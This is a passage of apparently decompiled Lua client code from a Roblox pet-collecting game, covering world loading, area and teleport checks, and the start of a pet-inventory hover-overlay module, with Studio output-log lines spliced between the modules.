	if Shared.IsTradingPlaza then
		world = "Trading Plaza"
	end
	
	if not game:GetService("RunService"):IsStudio() and world == "Trading Plaza" and not Shared.IsTradingPlaza then
		world = "Spawn"
	end
	
	if not Directory.Worlds[tostring(world)] then
		world = "Spawn"
	end
	
	if world == "Diamond Mine" then
		assert(Save.Get())
		if Signal.Invoke("Get Diamond Mine Collpase Time") then
			world = "Spawn"
		end
	end
	
	local Loading = GUIFX.Loading(tostring(world))
	local Character = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
	local HumanoidRootPart = Character:WaitForChild("HumanoidRootPart")
	
	HumanoidRootPart.Anchored = true
	
	local save = Save.Get()
	assert(save)
	
	local RequestWorld = Network.Invoke("Request World", world)
	if not RequestWorld then
		HumanoidRootPart.Anchored = false
		Loading()
		return false
	end
	
	if not IsHardcore then
		save.World = world
	else
		save.Hardcore.World = world
	end
	
	while not Players.LocalPlayer.PlayerGui:FindFirstChild("__MAP") do
		RunService.RenderStepped:Wait()
	end
	
	local Character = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
	local HumanoidRootPart2 = Character:WaitForChild("HumanoidRootPart")
	HumanoidRootPart2.Anchored = true
	
	if game.Workspace:FindFirstChild("__MAP") then
		game.Workspace:FindFirstChild("__MAP"):Destroy()
	end
	
	Coins:ClearAllChildren()
	Orbs:ClearAllChildren()
	Lootbags:ClearAllChildren()
	
	local PlayerGui = Players.LocalPlayer.PlayerGui
	local __MAP = PlayerGui:FindFirstChild("__MAP")
	
	while not __MAP do
		wait(0.1)
		PlayerGui:FindFirstChild("__MAP")
	end
	
	local MAP = __MAP:WaitForChild("MAP", 9999999)
	local LIGHTING = IsHardcore and __MAP:FindFirstChild("HARDCORE_LIGHTING") or __MAP:WaitForChild("LIGHTING", 9999999)
	local Settings = LIGHTING:WaitForChild("Settings")
	
	local Dir = Directory.Worlds[world]
	
	for i, child in ipairs(game.Lighting:GetChildren()) do
		if child.Name == "EggBlur" then continue end
		child:Destroy()
	end
	
	MAP:FindFirstChild("Spawns"):Destroy()
	
	for i, child in ipairs(LIGHTING:GetChildren()) do
		if child.ClassName == "Configuration" then continue end
		local Clone_ret = child:Clone()
		Clone_ret.Name = "__WORLDFX"
		Clone_ret.Parent = game.Lighting
	end
	
	for i, child in ipairs(Settings:GetChildren()) do
		game.Lighting[child.Name] = child.Value
	end
	
	local __MAPDEBRIS = __DEBRIS:FindFirstChild("__MAPDEBRIS")
	
	if not __MAPDEBRIS then
		__MAPDEBRIS = Instance.new("Folder")
		__MAPDEBRIS.Name = "__MAPDEBRIS"
		__MAPDEBRIS.Parent = __DEBRIS
	else
		__MAPDEBRIS:ClearAllChildren()
	end
	
	if MAP:FindFirstChild("Debris") then
		MAP.Debris.Parent = __MAPDEBRIS
	end
	
	MAP.Name = "__MAP"
	MAP.Parent = game.Workspace
	
	for i, descendant in ipairs(MAP:WaitForChild("Audio", 9999999):GetDescendants()) do
		if descendant.ClassName ~= "Sound" then continue end
		local string_match_ret = string.match(descendant.SoundId, "%d+")
		local playingAudio = Audio.Play(string_match_ret, descendant.Parent, descendant.Pitch, descendant.Volume, descendant.MaxDistance, descendant.SoundGroup, descendant.Looped)
		playingAudio.RollOffMinDistance = descendant.RollOffMinDistance
	end
	
	__MAP:Destroy()
	
	game.Workspace.Gravity = Dir.gravity or 196.2
	
	local Children = MAP:FindFirstChild("PlayerSpawns"):GetChildren()
	
	local CFrame = Children[math.random(1, #Children)].CFrame
	local PositionData = save.PositionData
	
	local deb = false
	
	local function from_array(array)
		return CFrame.new(array[1], array[2], array[3], array[4], array[5], array[6], array[7], array[8], array[9], array[10], array[11], array[12])
	end
	
	if arg and PositionData and PositionData.PlayerCFrame then
		deb = true
		local t_PlayerCFrame = PositionData.PlayerCFrame
		CFrame = CFrame.new(t_PlayerCFrame[1], t_PlayerCFrame[2], t_PlayerCFrame[3], t_PlayerCFrame[4], t_PlayerCFrame[5], t_PlayerCFrame[6], t_PlayerCFrame[7], t_PlayerCFrame[8], t_PlayerCFrame[9], t_PlayerCFrame[10], t_PlayerCFrame[11], t_PlayerCFrame[12])
	end
	
	local Character = Players.LocalPlayer.Character or Players.LocalPlayer.CharacterAdded:Wait()
	local HumanoidRootPart3 = Character:WaitForChild("HumanoidRootPart")
	local Humanoid = Character:WaitForChild("Humanoid")
	
	Character:SetPrimaryPartCFrame(CFrame + Vector3.new(0, 8, 0))
	HumanoidRootPart3.AssemblyLinearVelocity = Vector3.new()
	HumanoidRootPart3.AssemblyAngularVelocity = Vector3.new()
	HumanoidRootPart3.Anchored = false
	Humanoid.PlatformStand = false
	
	if deb and PositionData.CameraCFrame and PositionData.CameraFocus then
		local CameraCFrame = PositionData.CameraCFrame
		local cf = CFrame.new(CameraCFrame[1], CameraCFrame[2], CameraCFrame[3], CameraCFrame[4], CameraCFrame[5], CameraCFrame[6], CameraCFrame[7], CameraCFrame[8], CameraCFrame[9], CameraCFrame[10], CameraCFrame[11], CameraCFrame[12])
		local CameraFocus = PositionData.CameraFocus
		local cf2 = CFrame.new(CameraFocus[1], CameraFocus[2], CameraFocus[3], CameraFocus[4], CameraFocus[5], CameraFocus[6], CameraFocus[7], CameraFocus[8], CameraFocus[9], CameraFocus[10], CameraFocus[11], CameraFocus[12])
		
		workspace.CurrentCamera.CFrame = cf
		
		local Magnitude = (cf.Position - cf2.Position).Magnitude
		local CameraMinZoomDistance = Players.LocalPlayer.CameraMinZoomDistance
		local CameraMaxZoomDistance = Players.LocalPlayer.CameraMaxZoomDistance
		local math_clamp_ret = math.clamp(Magnitude, CameraMinZoomDistance, CameraMaxZoomDistance)
		
		Players.LocalPlayer.CameraMinZoomDistance = math_clamp_ret
		Players.LocalPlayer.CameraMaxZoomDistance = math_clamp_ret
		
		task.delay(0.1, function() 
			Players.LocalPlayer.CameraMinZoomDistance = CameraMinZoomDistance
			Players.LocalPlayer.CameraMaxZoomDistance = CameraMaxZoomDistance
		end)
	end
	
	Signal.Fire("World Changed", world, MAP)
	
	task.wait(0.5)
	
	task.spawn(function() 
		task.wait(1.5)
		if Variables.LoadingWorld then return end
		Audio.Play("rbxassetid://7358008634", script, 1, 0.3)
		local WorldLoaded = GUI.WorldLoaded
		local WorldTitle = WorldLoaded.WorldTitle
		WorldTitle.Text = "~" .. Dir.display .. "~"
		WorldTitle.TextTransparency = 1
		WorldTitle.TextStrokeTransparency = 1
		WorldTitle.Position = UDim2.new(0.5, 0, 0.025, 0)
		WorldLoaded.Gui.Enabled = true
		
		Functions.Tween(WorldTitle:FindFirstChildOfClass("UIStroke"), {Transparency = 0}, {
			0.4,
			"Sine",
			"Out"
		})
		
		Functions.Tween(WorldTitle, {
			TextTransparency = 0,
			TextStrokeTransparency = 0,
			Position = UDim2.new(0.5, 0, 0.05, 0)
		}, {
			0.4,
			"Sine",
			"Out"
		}).Completed:Wait()
		
		task.wait(2)
		
		Functions.Tween(WorldTitle:FindFirstChildOfClass("UIStroke"), {Transparency = 1}, {
			0.4,
			"Sine",
			"In"
		})
		
		Functions.Tween(WorldTitle, {
			TextTransparency = 1,
			TextStrokeTransparency = 1,
			Position = UDim2.new(0.5, 0, 0.025, 0)
		}, {
			0.4,
			"Sine",
			"In"
		}).Completed:Wait()
		
		WorldLoaded.Gui.Enabled = false
	end)
	
	Loading()
	Variables.LoadingWorld = false
	return true
end

function WorldCmds.HasArea(area)
	assert(typeof(area) == "string")
	assert(Directory.Areas[area])
	
	local save = Save.Get()
	if not save then
		return false
	end
	
	assert(save)
	
	if area == "VIP" then
		return Functions.SearchArray(save.AreasUnlocked, area) or Functions.SearchArray(save.Hardcore.AreasUnlocked, area)
	end
	
	return Functions.SearchArray(IsHardcore and save.Hardcore.AreasUnlocked or save.AreasUnlocked, area)
end

function WorldCmds.HasAccess(world) 
	assert(typeof(world) == "string")
	
	local dir = Directory.Worlds[world]
	assert(dir)
	
	local requiredArea = dir.requiredArea
	
	if requiredArea and not WorldCmds.HasArea(requiredArea) then
		return false
	end
	
	return true
end

function WorldCmds.Get(player) 
	local save = Save.Get(player)
	if not save then
		return nil
	end
	
	assert(save)
	
	return IsHardcore and save.Hardcore.World or save.World
end

function WorldCmds.GetMap() 
	return game.Workspace:WaitForChild("__MAP", 9999)
end

function WorldCmds.GetDir()
	local dir = WorldCmds.Get()
	assert(dir)
	
	return Directory.Worlds[dir]
end

function WorldCmds.HasLoaded() 
	if Variables.LoadingWorld == nil then
		return false
	end
	
	if Variables.LoadingWorld == true then
		return false
	end
	
	local __MAP = game.Workspace:FindFirstChild("__MAP")
	
	if not __MAP then
		return false
	end
	
	if not __MAP:FindFirstChild("PlayerSpawns") then
		return false
	end
	return true
end

function WorldCmds.HasTeleport(area) 
	assert(typeof(area) == "string")
	
	local dir = Directory.Areas[area]
	assert(dir)
	
	local save = Save.Get()
	if not save then
		return false
	end
	assert(save)
	
	if not WorldCmds.HasAccess(dir.world) then
		return false
	end
	
	if not WorldCmds.HasArea(area) then
		return false
	end
	
	if Gamepasses.Owns(TeleportID) then
		return true
	end
	
	if Functions.SearchArray(IsHardcore and save.Hardcore.TeleportsUnlocked or save.TeleportsUnlocked, area) then
		return true
	end
	
	return false
end

function WorldCmds.CanDoAction() 
	
	return not Variables.LoadingWorld and not Variables.UsingCannon and (Variables.OpeningEgg <= 0 and not Variables.Trading and not Variables.UsingMachine and WorldCmds.HasLoaded() or false)
end

function WorldCmds.GetAllEggs() 
	local allEggs = {}
	
	local Map = WorldCmds.GetMap()
	if Map then
		local Eggs = Map:FindFirstChild("Eggs")
		
		if Eggs then
			for i, child in ipairs(Eggs:GetChildren()) do
				if not child:FindFirstChild("Eggs") then continue end
				
				for i, child2 in ipairs(child.Eggs:GetChildren()) do
					if not child2:GetAttribute("ID") then continue end
					table.insert(allEggs, child2)
				end
			end
		end
	end
	
	return allEggs
end

function WorldCmds.GetAllGates() 
	local allGates = {}
	local Map = WorldCmds.GetMap()
	
	if Map then
		local Gates = Map:FindFirstChild("Gates")
		
		if Gates then
			for i, child in ipairs(Gates:GetChildren()) do
				table.insert(allGates, child)
			end
		end
	end
	return allGates
end

Network.Invoked("Has Loaded").OnInvoke = function()
    return WorldCmds.HasLoaded()
end

return WorldCmds
  -  Editar
  04:54:13.758    -  Editar
  04:54:13.758  ----- [2303] ReplicatedStorage.Library.Client.PetUI -----  -  Editar
  04:54:13.758  --[[    
                                                                   ,,╓╓╖╖╥╥@@@,,,╓╖╖╖
                                                            ,,╓╓╖╖╖@@@╢╢║╢╢╣▒▒▒▒▒▒▒▒▒
                                          ,,,╓╖╖╖╥@@@╢╢╢╢╢▒▒▒╢╢╜╜╙````"╙╜╢╣▒▒▒▒▒▒▒▒▒▒
                         ,,,╓╖╖╥@@@@╢║╢╢▒▒╢╢╢Ñ╨╨╨▒▒▒▒▒▒▒▒▒╢╜`              ╙╢▒▒▒▒▒▒▒▒
        ,,╓╖╖╖╥@@@╢╢╢╢╢▒▒╢╢╢╢╢╢╢▒▒▒▒▒▒▒▒▒▒       ╢▒▒▒▒▒▒▒╜                   ╙╢▒▒▒▒▒▒
        ]▒▒▒▒▒╜╜╙"``              ╙╢▒▒▒▒▒▒░      ║▒▒▒▒▒▒╜       ╥@╣╢╢@╖       ,╢▒▒▒▒▒▒
         ▒▒▒▒▒L                     ╙╢▒▒▒▒▒      ]▒▒▒▒▒▒      ,╣▒▒▒▒▒▒▒╢╖,╓@╣╢▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒        ,,,╓╓╓,       ]▒▒▒▒╣       ╢▒▒▒▒       ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ║▒▒▒▒▒       ╢▒▒▒▒▒▒▒@       ▒▒▒▒▒       ║▒▒▒▒       ╢▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
         ]▒▒▒▒▒       ║▒▒▒▒▒▒▒Ñ      ,▒▒▒▒▒▒      ]▒▒▒▒       ╢▒▒▒▒▒╜╜╜╙"``     └▒▒▒▒▒▒s
          ▒▒▒▒▒▒      ╙╝╨╜╜╜╙       ╓╢▒▒▒▒▒▒      └▒▒▒▒       ║▒▒▒▒▒             ╢▒▒▒▒▒
          ║▒▒▒▒▒                   ╙╨╢▒▒▒▒▒╢       ║▒▒▒H      ╙▒▒▒▒▒▒            ║▒▒▒▒▒░
          ]▒▒▒▒▒                      ╙╢▒▒▒▒       ║▒▒▒╢       ║▒▒▒▒╢@@@╣╢C      ]▒▒▒▒▒▒
           ▒▒▒▒▒~      ╓╖╥@@@@@@,      `╢▒▒▒▒      ]▒▒▒▒H       ╙╣▒▒▒▒▒▒▒╜        ▒▒▒▒▒▒
           ║▒▒▒▒▒      ]▒▒▒▒▒▒▒▒▒∩      ║▒▒▒╣       ▒▒▒▒▒╖        ╙╨╝╝╜╜          ║▒▒▒▒▒
           ║▒▒▒▒╣       ╢▒▒▒▒▒▒▒▒░      ]▒▒▒▒       ║▒▒▒▒▒Ñ                       ╠▒▒▒▒▒∩
           └▒▒▒▒▒       ║▒▒╢╢╢╝╜`       ║▒▒▒▒▒      ]▒▒▒▒▒▒▒@╖             ╓╣.,,,╓║▒▒▒▒▒▒
            ╢▒▒▒▒▒                     ║▒▒▒▒▒▒      └▒▒▒▒▒▒▒▒▒╣╢@╥╖╖╖╖╖@@╢▒▒▒▒▒╢╢╢╝╨╜╜╜╙"
            ║▒▒▒▒▒                  ╓@╢▒▒▒▒▒▒▒╖╓╖╖╥@@▒▒▒▒▒▒▒▒▒╢╢╢╨╜╜╜╜╙╙``
            ]▒▒▒▒▒        ,,,╓╓╖@@╣╢▒▒▒▒▒▒▒▒▒╢║╨╨╜╜╜╙╙"``        ,,╓╓╖╥╗   ,@╢▒▒▒╣╣╗
             ▒▒▒▒▒Ñ@╣╢╢╣▒▒▒╢╢║╨╨╜╜╜╙╙`'        ,,,╓╖,    ║╣╢   ╢▒▒▒▒▒▒╢╢H ╓▒▒╢╙``╙╨Ñ
             ╨╜╜╜╜╙"``            ╓╥@@@╥╖    ║▒▒▒▒▒▒▒▒N  ║▒▒[  ║▒▒U       ]▒▒╢╖,,
                     ╓╣╢▒▒╢╣╖   ╓╢▒▒Ñ╨╣▒▒╢,  ║▒▒[   ║▒▒H ]▒▒╢  ]▒▒║╖╖╥╗╖   ╙╢▒▒▒▒▒╣╣╖
                    ╢▒▒╜""╙▒▒Ñ  ╢▒▒     ╢▒╣  ]▒▒▒   ║▒▒▒  ▒▒▒   ▒▒▒╢╢Ñ╝╨       `"╙╢▒▒H
                   ]▒▒▒    `    ▒▒▒     ╠▒▒[  ▒▒▒╢╣▒▒▒╝   ║▒▒∩  ║▒▒        ╓╣╖,,,╓╢▒▒`
                   ║▒▒▒         ╢▒▒     ]▒▒[  ║▒▒╜``      ]▒▒▒  ]▒▒N@@Ñ╣╣╢ ╙╢▒▒▒▒▒▒Ñ`
                   └▒▒╢     ╖╖, ╙▒▒╢    ║▒▒┘  ║▒▒▒         ▒▒╢  ]╢╢╢╝╝╨╜╜╙
                    ╙▒▒╣╖,,╥▒▒Ñ  ╙╢▒▒╢╢▒▒╢╜   └╢╢▒
                     ╙╢▒▒▒▒▒╢╜      ╙╜
                                 

	BIG Copies rbx.lua Framework [2023] - [2023]
	Written by OneX - 1037898275229020250
	Developed with a keyboard and pixie dust.
	
	-+-+-+- SPECIFICS -+-+-+-
	_L.PetUI
	===========
		
	===========
	
--]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

local table1 = {};
local table2 = {
	Rare = 1,
	Epic = 2,
	Legendary = 2,
	Mythical = 1,
	Secret = 1,
	Event = 1,
	Exclusive = 1
};
local ReplicatedStorage = game:GetService("ReplicatedStorage");
local Players = game:GetService("Players");
local RunService = game:GetService("RunService");
local Assets = ReplicatedStorage:WaitForChild("Assets");
local Library = ReplicatedStorage:WaitForChild("Library");
local Modules = Library:WaitForChild("Modules");
local Client = Library:WaitForChild("Client");
local m_Shared = require(Library.Shared);
local m_Variables = require(Library.Variables);
local m_Directory = require(Library.Directory);
local _ = require(Modules.Pets);
local m_Functions = require(Library.Functions);
local m_Audio = require(Library.Audio);
local m_RAPShared = require(Library.RAPShared);
local m_PetCmds = require(Client.PetCmds);
local m_Network = require(Client.Network);
local m_Save = require(Client.Save);
local m_Settings = require(Client.Settings);
local m_InfoOverlay = require(Client.InfoOverlay);
local _ = require(Client.RAPCmds);
local m_FFlags = require(Client.FFlags);
local t_LocalPlayer = Players.LocalPlayer;
local Random_new_ret = Random.new();
local u1 = nil;
local Color3_fromHSV_ret = nil;
local u2 = nil;
function prepareColor(p5)
	return m_Functions.ClampColor((m_Functions.CorrectColor((m_Functions.VecToColor(p5)))));
end;
function table1.CreateStaticHover(p1, p2, p3) -- Line: 75
	--[[
		Upvalues:
			[1] = t_LocalPlayer
			[2] = m_Directory
			[3] = m_Save
			[4] = m_Shared
			[5] = m_Functions
			[6] = m_Settings
			[7] = m_FFlags
			[8] = m_RAPShared
			[9] = m_InfoOverlay
			[10] = m_Audio
	--]]
	debug.profilebegin("PetUI.CreateStaticHover");
	local v1 = t_LocalPlayer;
	local table3 = {
		id = p2,
		uid = "",
		idt = 0,
		s = 0,
		e = false,
		nk = t_LocalPlayer.DisplayName
	};
	if p3 then
		for key3, val3 in pairs(p3) do
			table3[key3] = val3;
		end
	end
	local t_id = table3.id;
	local u4 = m_Directory.Pets[t_id];
	local _ = table3.idt;
	local v2 = m_Save.Get(v1);
	if v2 then
		local _ = m_Shared.HasPetEquipped(v2, table3);
	end
	local _ = table3.s;
	local _ = table3.l;
	local t_g = table3.g;
	local t_r = table3.r;
	local t_dm = table3.dm;
	local t_sh = table3.sh;
	local t_hc = table3.hc;
	local t_powers = table3.powers;
	local t_isGift = u4.isGift;
	if (not t_dm or not u4.darkMatterThumbnail) and (not t_g or not u4.goldenThumbnail) then
		local _ = u4.thumbnail;
	end
	local _ = u4.name;
	local _ = u4.tradeable;
	local t_rarity = u4.rarity;
	local bool1 = false;
	local bool2 = false;
	local bool3 = false;
	for _, val1 in ipairs(t_powers or {}) do
		if val1[1] == "Titanic" then
			bool1 = true;
			break;
		end
		if val1[1] == "Best Friend" then
			bool2 = true;
			break;
		end
		if val1[1] ~= "Companion" then continue end
		bool3 = true;
	end
	if u4.titanic then
		bool1 = true;
	elseif u4.huge then
		bool2 = true;
	elseif u4.companionEnchantLevel ~= nil then
		bool3 = true;
	end
	local FindFirstAncestorWhichIsA_ret = nil;
	local u5 = false;
	local coroutine_wrap_ret = coroutine.wrap(function() -- Line: 143
		--[[
			Upvalues:
				[1] = p1
				[2] = FindFirstAncestorWhichIsA_ret
				[3] = u5
		--]]
		while not p1.Parent do
			wait(0.5);
		end
		FindFirstAncestorWhichIsA_ret = p1:FindFirstAncestorWhichIsA("ScreenGui");
		local t_Parent = p1.Parent;
		local bool4 = true;
		if t_Parent and t_Parent.ClassName == "ScrollingFrame" then
			local u22 = 0;
			local u23 = 0;
			local Connect_ret = nil;
			Connect_ret = game:GetService("RunService").RenderStepped:Connect(function(p10) -- Line: 180
				--[[
					Upvalues:
						[1] = u22
						[2] = u23
						[3] = p1
						[4] = Connect_ret
						[5] = u5
						[6] = FindFirstAncestorWhichIsA_ret
						[7] = t_Parent
						[8] = bool4
				--]]
				u22 = u22 + p10;
				if u22 < u23 then return end
				u23 = u22 + (math.random() * 0.5 + 0.25);
				debug.profilebegin("PetUI.Create.Culling");
				if not p1.Parent then
					Connect_ret:Disconnect();
					debug.profileend();
					return;
				end
				local bool5;
				if FindFirstAncestorWhichIsA_ret.Enabled then
					if p1.Visible then
						local t_Y = p1.AbsolutePosition.Y;
						local t_Y2 = t_Parent.AbsolutePosition.Y;
						local v30 = t_Parent.AbsoluteWindowSize.Y * 2;
						if t_Y2 + v30 <= t_Y or t_Y <= t_Y2 - v30 then
							bool5 = false;
						else
							bool5 = true;
						end
					else
						bool5 = false;
					end
				else
					bool5 = false;
				end
				if u5 ~= bool5 or bool4 then
					bool4 = false;
					u5 = bool5;
					p1:SetAttribute("isVisible", u5);
				end
				debug.profileend();
			end);
		else
			p1:SetAttribute("isVisible", true);
			u5 = true;
		end
	end);
	coroutine_wrap_ret();
	local function ShowOverlay() -- Line: 224
		--[[
			Upvalues:
				[1] = table3
				[2] = u4
				[3] = t_rarity
				[4] = t_isGift
				[5] = t_hc
				[6] = t_dm
				[7] = t_r
				[8] = t_g
				[9] = t_sh
				[10] = bool3
				[11] = m_Shared
				[12] = bool2
				[13] = bool1
				[14] = m_Save
				[15] = t_id
				[16] = m_Functions
				[17] = m_Settings
				[18] = p1
				[19] = m_Directory
				[20] = m_FFlags
				[21] = m_RAPShared
				[22] = m_InfoOverlay
		--]]
		debug.profilebegin("PetUI.Create.ShowOverlay");
		if not table3 then
			debug.profileend();
			return;
		end
		if not table3 then
			debug.profileend();
			return;
		end
		local table4 = {{
			"Title",
			u4.name,
			t_rarity
		}};
		if not t_isGift then
			table.insert(table4, {
				"Nickname",
				'"' .. (table3.nk or "???") .. '"',
				table3.snk
			});
		end
		if t_hc then
			table.insert(table4, {
				"Block",
				"Hardcore",
				"Hardcore"
			});
		end
		table.insert(table4, {
			"Rarity",
			t_rarity
		});
		if t_dm then
			table.insert(table4, {
				"Block",
				"Dark Matter",
				"Dark Matter"
			});
		elseif t_r then
			table.insert(table4, {
				"Block",
				"Rainbow",
				"Rainbow"
			});
		elseif t_g then
			table.insert(table4, {
				"Block",
				"Golden",
				"Golden"
			});
		end
		if t_sh then
			table.insert(table4, {
				"Block",
				"Shiny",
				"Shiny"
			});
		end
		local v8 = nil;
		local v9 = nil;
		if bool3 then
			v8, v9 = m_Shared.GetPowerDir("Companion", tostring(u4.companionEnchantLevel));
		elseif bool2 then
			v8, v9 = m_Shared.GetPowerDir("Best Friend", "1");
		elseif bool1 then
			v8, v9 = m_Shared.GetPowerDir("Titanic", "1");
		end
		--v2
		local rep = table3.rep
		if u4.replacements and rep then
			if #rep > 0 then
				for i,v in ipairs(rep) do
					table.insert(table4, {"Replacement", table3.id, v})
				end
			end
		end
		if v8 and v9 then
			table.insert(table4, {
				"Power",
				v8.title,
				v8.desc,
				v9.isUnique
			});
		end
		if u4.guarenteedEnchants then
			for _, val5 in ipairs(u4.guarenteedEnchants) do
				local unpack_ret1, unpack_ret2, _ = unpack(val5);
				local v18, v19 = m_Shared.GetPowerDir(unpack_ret1, unpack_ret2);
				if not v18 or not v19 then continue end
				table.insert(table4, {
					"Power",
					v18.title,
					v18.desc,
					v19.isUnique
				});
			end
		end
		local t_merchData = table3.merchData;
		local t_serialData = table3.serialData;
		if m_Shared.ShowPetExists(table3) then
			local v12 = m_Save.Get();
			assert(v12);
			local GetPetsInExistence_ret1, GetPetsInExistence_ret2 = GetPetsInExistence(t_id);
			if GetPetsInExistence_ret1 and GetPetsInExistence_ret2 then
				local v20 = GetPetsInExistence_ret1 < 100000 and m_Functions.Commas(GetPetsInExistence_ret1) or m_Functions.NumberShorten(GetPetsInExistence_ret1);
				table.insert(table4, {
					"Rare",
					v20 .. " Exist"
				});
			end
		end
		if t_merchData then
			table.insert(table4, {
				"MerchSerial",
				t_merchData.serial or 0
			});
			table.insert(table4, {
				"MerchPlayer",
				t_merchData.user or -1
			});
		elseif t_serialData then
			table.insert(table4, {
				"MerchSerial",
				t_serialData.serial or 0
			});
			table.insert(table4, {
				"MerchPlayer",
				t_serialData.user or -1
			});
		end
		if table3.snk then
			table.insert(table4, {"Signed"});
		end
		if m_Settings.ShowPetDebug then
			table.insert(table4, {
				"Nickname",
				"PetID: " .. table3.id
			});
			table.insert(table4, {
				"debug_UID",
				table3.uid,
				p1
			});
		end
		if u4.tradeable and t_isGift then
			if u4.giftEggId then
				local v21 = m_Directory.Eggs[u4.giftEggId];
				table.insert(table4, {
					"Nickname",
					"Contains:"
				});
				table.insert(table4, {
					"GiftPetOdds",
					u4.giftEggId,
					v21.drops
				});
			end
			if u4.tradeable then
				table.insert(table4, {"Tradeable"});
			end
		end
		if m_FFlags.Get(m_FFlags.Keys.RAP) or m_FFlags.CanBypass() then
			local v13 = m_RAPShared.CreateKey(table3);
			if v13 then
				table.insert(table4, {
					"RAP",
					v13
				});
			end
		end
		if m_FFlags.CanBypass() then
			local t_o = table3.o;
			if t_o then
				table.insert(table4, {
					"OpenedBy",
					t_o[1],
					t_o[2]
				});
			end
			local t_h = table3.h;
			if t_h then
				table.insert(table4, {
					"OwnerCount",
					t_h.n
				});
				local v22 = t_h.l[2];
				if v22 then
					table.insert(table4, {
						"LastOwner",
						v22[1],
						v22[2]
					});
				end
			end
		end
		m_InfoOverlay.Add(p1, unpack(table4));
		debug.profileend();
	end
	p1.MouseEnter:Connect(function() -- Line: 375
		--[[
			Upvalues:
				[1] = m_Audio
				[2] = ShowOverlay
		--]]
		m_Audio.Play("rbxassetid://6907626084", script, 1, 0.2);
		ShowOverlay();
	end);
	p1.SelectionGained:Connect(function() -- Line: 380
		--[[
			Upvalues:
				[1] = m_Audio
				[2] = ShowOverlay
		--]]
		m_Audio.Play("rbxassetid://6907626084", script, 1, 0.2);
		ShowOverlay();
	end);
	debug.profileend();
end
function table1.Create(p4, p5, p6) -- Line: 388
	--[[
		Upvalues:
			[1] = t_LocalPlayer
			[2] = m_PetCmds
			[3] = m_Save
			[4] = m_Shared
			[5] = m_Directory
			[6] = Assets
			[7] = RunService
			[8] = m_Functions
			[9] = table2
			[10] = Color3_fromHSV_ret
			[11] = Random_new_ret
			[12] = m_Settings
			[13] = m_Variables
			[14] = m_FFlags
			[15] = m_RAPShared
			[16] = m_InfoOverlay
			[17] = m_Audio
	--]]
	debug.profilebegin("PetUI.Create");
	local u18;
	local u19;
	if p6 then
		u19 = t_LocalPlayer;
		local table6 = {
			id = p5,
			uid = "",
			idt = 0,
			s = 0,
			e = false,
			nk = t_LocalPlayer.DisplayName
		};
		u18 = table6;
		for key4, val4 in pairs(p6) do
			u18[key4] = val4;
		end
	else
		local v6, v7 = m_PetCmds.Get(p5);
		if not v6 or not v7 then
			debug.profileend();
			return;
		end
		assert(v6 and v7);
		u18 = v6;
		u19 = v7;
	end
	local t_id2 = u18.id;
	local t_idt = u18.idt;
	local v3 = m_Save.Get(u19);
	local u7 = v3 and m_Shared.HasPetEquipped(v3, u18);
	local t_s = u18.s;
	local t_l = u18.l;
	local u8 = u18.g;
	local u9 = u18.r;
	local u10 = u18.dm;
	local t_sh2 = u18.sh;
	local t_hc2 = u18.hc;
	local t_powers2 = u18.powers;
	local u11 = m_Directory.Pets[t_id2];
	local t_isGift2 = u11.isGift;
	local u12 = u10 and u11.darkMatterThumbnail or u8 and u11.goldenThumbnail or u11.thumbnail;
	local _ = u11.name;
	local _ = u11.tradeable;
	local t_rarity2 = u11.rarity;
	local bool6 = false;
	local bool7 = false;
	local bool8 = false;
	for _, val2 in ipairs(t_powers2 or {}) do
		if val2[1] == "Titanic" then
			bool6 = true;
			break;
		end
		if val2[1] == "Best Friend" then
			bool7 = true;
			break;
		end
		if val2[1] ~= "Companion" then continue end
		bool8 = true;
	end
	local FindFirstAncestorWhichIsA_ret2 = nil;
	local u13 = false;
	local coroutine_wrap_ret2 = coroutine.wrap(function() -- Line: 467
		--[[
			Upvalues:
				[1] = p4
				[2] = FindFirstAncestorWhichIsA_ret2
				[3] = u13
		--]]
		while not p4.Parent do
			wait(0.5);
		end
		FindFirstAncestorWhichIsA_ret2 = p4:FindFirstAncestorWhichIsA("ScreenGui");
		local t_Parent2 = p4.Parent;
		local bool9 = true;
		if t_Parent2 and t_Parent2.ClassName == "ScrollingFrame" then
			local u24 = 0;
			local u25 = 0;
			local Connect_ret2 = nil;
			Connect_ret2 = game:GetService("RunService").RenderStepped:Connect(function(p11) -- Line: 504
				--[[
					Upvalues:
						[1] = u24
						[2] = u25
						[3] = p4
						[4] = Connect_ret2
						[5] = u13
						[6] = FindFirstAncestorWhichIsA_ret2
						[7] = t_Parent2
						[8] = bool9
				--]]
				u24 = u24 + p11;
				if u24 < u25 then return end
				u25 = u24 + (math.random() * 0.5 + 0.25);
				debug.profilebegin("PetUI.Create.Culling");
				if not p4.Parent then
					Connect_ret2:Disconnect();
					debug.profileend();
					return;
				end
				local bool10;
				if FindFirstAncestorWhichIsA_ret2.Enabled then
					if p4.Visible then
						local t_Y3 = p4.AbsolutePosition.Y;
						local t_Y4 = t_Parent2.AbsolutePosition.Y;
						local v31 = t_Parent2.AbsoluteWindowSize.Y * 2;
						if t_Y4 + v31 <= t_Y3 or t_Y3 <= t_Y4 - v31 then
							bool10 = false;
						else
							bool10 = true;
						end
					else
						bool10 = false;
					end
				else
					bool10 = false;
				end
				if u13 ~= bool10 or bool9 then
					bool9 = false;
					u13 = bool10;
					p4:SetAttribute("isVisible", u13);
				end
				debug.profileend();
			end);
		else
			p4:SetAttribute("isVisible", true);
			u13 = true;
		end
	end);
	coroutine_wrap_ret2();
	local coroutine_wrap_ret3 = coroutine.wrap(function() -- Line: 548
		--[[
			Upvalues:
				[1] = FindFirstAncestorWhichIsA_ret2
				[2] = p4
				[3] = Assets
				[4] = u13
				[5] = RunService
		--]]
		local Clone_ret = nil;
		local v10 = false;
		local v11 = 0;
		while not FindFirstAncestorWhichIsA_ret2 do
			wait(0.5);
		end
		while p4 and p4.Parent and not p4.PetIcon.IsLoaded do
			debug.profilebegin("PetUI.Create.PetIconAnimation");
			if not Clone_ret then
				Clone_ret = Assets.UI.Inventory.LoadingPetIcon:Clone();
				Clone_ret.Parent = p4.PetIcon;
			end
